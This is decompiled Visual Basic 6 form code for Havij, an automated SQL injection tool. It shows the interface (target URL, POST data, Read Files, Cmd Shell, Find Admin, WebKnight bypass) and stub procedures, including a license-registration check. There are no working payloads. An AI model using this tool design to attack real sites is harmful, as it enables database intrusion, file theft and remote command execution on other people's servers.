               ImageKey        =   "pause"
            EndProperty
         EndProperty
      End
      Begin VB.Label Label17
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Post Data:"
         Height          =   195
         Left            =   360
         TabIndex        =   92
         Top             =   1560
         Width           =   750
      End
      Begin VB.Label Label15
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Database:"
         Height          =   195
         Left            =   360
         TabIndex        =   31
         Top             =   1200
         Width           =   735
      End
      Begin VB.Label Label12
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Type:"
         Height          =   195
         Left            =   5760
         TabIndex        =   6
         Top             =   1200
         Width           =   405
      End
      Begin VB.Label Label11
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Method:"
         Height          =   195
         Left            =   3840
         TabIndex        =   4
         Top             =   1200
         Width           =   585
      End
      Begin VB.Label Label1
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Target:"
         Height          =   195
         Left            =   360
         TabIndex        =   3
         Top             =   360
         Width           =   510
      End
   End
   Begin MSWinsockLib.Winsock Win
      Left            =   4440
      Top             =   7920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin RichTextLib.RichTextBox txtLog
      Height          =   2175
      Left            =   360
      TabIndex        =   1
      Top             =   8400
      Width           =   9135
      _ExtentX        =   16113
      _ExtentY        =   3836
      _Version        =   393217
      DisableNoScroll =   -1
      ReadOnly        =   -1
      Enabled         =   -1
      BackColor       =  -2147483643
      ScrollBars      =   3
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0
         Italic          =   0
         Strikethrough   =   0
      EndProperty
   End
   Begin MSComctlLib.Toolbar tlbMain
      Height          =   540
      Left            =   360
      TabIndex        =   9
      Top             =   2520
      Width           =   9615
      _ExtentX        =   16960
      _ExtentY        =   953
      _Version        =   393216
      AllowCustomize  =   0
      Wrappable       =   0
      ButtonWidth     =   1561
      ButtonHeight    =   953
      Style           =   1
      ImageList       =   "imlToolBar"
      DisabledImageList =   "imlToolBarDisabled"
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
         NumButtons      =   9
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Value           =   1
            Caption         =   "About"
            Object.Tag      =   "0"
            ImageKey        =   "havij"
         EndProperty
         BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Info"
            Object.Tag      =   "1"
            ImageKey        =   "info"
         EndProperty
         BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Tables"
            Object.Tag      =   "2"
            ImageKey        =   "tables"
         EndProperty
         BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Read Files"
            Object.Tag      =   "3"
            ImageKey        =   "readfiles"
         EndProperty
         BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Cmd Shell"
            Object.Tag      =   "5"
            ImageKey        =   "cmd"
         EndProperty
         BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Query"
            Object.Tag      =   "6"
            ImageKey        =   "query"
         EndProperty
         BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Find Admin"
            Object.Tag      =   "7"
            ImageKey        =   "findadmin"
         EndProperty
         BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "MD5"
            Object.Tag      =   "8"
            ImageKey        =   "md5"
         EndProperty
         BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628}
            Style           =   2
            Caption         =   "Settings"
            Object.Tag      =   "4"
            ImageKey        =   "settings"
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock winAdmin
      Index           =   0
      Left            =   3720
      Top             =   7920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock winMD5
      Index           =   0
      Left            =   2880
      Top             =   7920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblClearLog
      AutoSize        =  -1
      BackStyle       =   0
      Caption         =   "Clear Log"
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   8880
      MouseIcon       =   "FORM01.FRX":14C04
      MousePointer    =   99
      TabIndex        =   84
      Top             =   8040
      Width           =   675
   End
   Begin VB.Image imgIcon
      Height          =   240
      Left            =   360
      Picture         =   "FORM01.FRX":14D56
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   7
      Left            =   360
      Picture         =   "FORM01.FRX":14F90
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   6
      Left            =   360
      Picture         =   "FORM01.FRX":15019
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   5
      Left            =   360
      Picture         =   "FORM01.FRX":150A3
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   4
      Left            =   360
      Picture         =   "FORM01.FRX":1512C
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   3
      Left            =   360
      Picture         =   "FORM01.FRX":151B5
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   2
      Left            =   360
      Picture         =   "FORM01.FRX":1523E
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   1
      Left            =   360
      Picture         =   "FORM01.FRX":152C7
      Top             =   7995
      Width           =   240
   End
   Begin VB.Image imgAnim
      Height          =   240
      Index           =   0
      Left            =   360
      Picture         =   "FORM01.FRX":15350
      Top             =   7995
      Width           =   240
   End
   Begin VB.Label lblStatus
      AutoSize        =  -1
      BackStyle       =   0
      Caption         =   "I'm IDLE"
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   1320
      TabIndex        =   29
      Top             =   8040
      Width           =   600
   End
   Begin VB.Label Label10
      AutoSize        =  -1
      BackStyle       =   0
      Caption         =   "Status:"
      Height          =   195
      Left            =   720
      TabIndex        =   28
      Top             =   8040
      Width           =   495
   End
   Begin VB.Menu mnuData
      Caption         =   "Data"
      Visible         =   0
      Begin VB.Menu editrow
         Caption         =   "Update Row"
      End
      Begin VB.Menu delRow
         Caption         =   "Delete Row"
      End
      Begin VB.Menu addRow
         Caption         =   "InsertRow"
      End
   End
   Begin VB.Menu mnuagent
      Caption         =   "Agent"
      Visible         =   0
      Begin VB.Menu mnuhavij
         Caption         =   "Havij"
      End
      Begin VB.Menu mnuIE
         Caption         =   "Internet Explorer"
      End
      Begin VB.Menu mnifFox
         Caption         =   "Mozilla Firefox"
      End
      Begin VB.Menu mnusafari
         Caption         =   "Safari"
      End
      Begin VB.Menu mnuopera
         Caption         =   "Opera"
      End
      Begin VB.Menu mnuInject_here
         Caption         =   "%Inject_Here%"
      End
   End
   Begin VB.Menu mnufindadmin
      Caption         =   "Find Admin"
      Visible         =   0
      Begin VB.Menu mnuopenurl
         Caption         =   "Open URL"
      End
   End
   Begin VB.Menu mnuTablesTree
      Caption         =   "Tables"
      Visible         =   0
      Begin VB.Menu mnuSelectChilds
         Caption         =   "Select all childs"
      End
      Begin VB.Menu mnuDeSelectChilds
         Caption         =   "Deselect all childs"
      End
      Begin VB.Menu mnusep1
         Caption         =   "-"
      End
      Begin VB.Menu mnuAddnode
         Caption         =   "Add Node"
      End
      Begin VB.Menu mnuAddChNode
         Caption         =   "Add Child Node"
      End
      Begin VB.Menu mnuchangenode
         Caption         =   "Change Node"
      End
      Begin VB.Menu mnuDelNode
         Caption         =   "Delete Node"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
 
' This form rebuilt by VBRezQ v3.3a.  2-Feb-2012 / 19:53:47
Option Explicit 
 
'Sub CheckRegistration()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew
'N  * ref: __vbaObjSet
'N  * ref: __vbaOnError
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: FileLen(
'N  * ref: Space(
'N  * ref: __vbaVar2Vec
'N  * ref: __vbaAryMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStr
'N  * ref: __vbaGetOwner3
'N  * ref: __vbaFileClose
'N  * ref: __vbaOnError
'N  * ref: LCase(
'N  * ref: "a"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVar2Vec
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaErase
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarCopy
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaVarIndexLoad
'N  * ref: ":"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarIndexLoad
'N  * ref: ":"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarIndexLoad
'N  * ref: ":"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: LCase(
'N  * ref: __vbaVarTstNe
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: DateValue(
'N  * ref: __vbaStrVarMove
'N  * ref: "Date"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_755
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: "Havij 1.15 Pro"
'N  * ref: "Havij 1.13 Pro"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaStrI2
'N  * ref: "Registered"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: DateValue(
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarTstLe
'N  * ref: __vbaFreeStr
'N  * ref: __vbaStrI2
'N  * ref: "Registered"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: "LastCheck"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: DateValue(
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaFpR8
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStr
'N  * ref: __vbaStrI2
'N  * ref: "Registered"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: "LastCheck"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrI2
'N  * ref: "Registered"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: Subr_745
'N  * ref: "Registered"
'N  * ref: __vbaStrCat
'N  * ref: Subr_751
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_743
'N  * ref: "Name"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaObjSet
'N  * ref: vbCrLf
'N  * ref: "Exp date: "
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: "\"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "regfile.hrf"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "RegFile"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: LCase(
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaStrToUnicode
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * API ref: CopyFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaStrToUnicode
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: "RegFile"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: "Can not copy license file! Please copy your license file to '"
'N  * ref: __vbaStrCat
'N  * ref: "' manually."
'N  * ref: MsgBox
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
'End Sub
 
'Sub isColumn()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub isTable()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_004()
'N  * ref: __vbaExceptHandler
'N  * ref: "&amp;"
'N  * ref: "&"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: "&quot;"
'N  * ref: """"
'N  * ref: "&lt;"
'N  * ref: "<"
'N  * ref: "&gt;"
'N  * ref: ">"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'End Sub
 
Sub addRow_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub Check10_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub Check12_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub Check2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub Check3_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub Check7_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
'Sub DeleteChilds()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'End Sub
 
Sub chkAllinOne_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub chkBypassWebknight_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub chkClear_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub chkclmPrefix_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub chkKeyword_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Auto Detect"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
End Sub
 
Sub chkManSyntax_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: "Auto Detect"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
End Sub
 
Sub chkReplacement_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
End Sub
 
Sub chkReplacement_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
End Sub
 
Sub chktblPrefix_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub cmbCMD_KeyDown(KeyCode As Integer, Shift As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub cmbMethod_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "POST"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
End Sub
 
Sub cmdAddrep_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "Enter Find_What::Replace_With like select::SeLeCt"
'N  * ref: __vbaVarDup
'N  * ref: InputBox(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: "::"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
End Sub
 
Sub cmdDelrep_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub Combo1_KeyDown(KeyCode As Integer, Shift As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
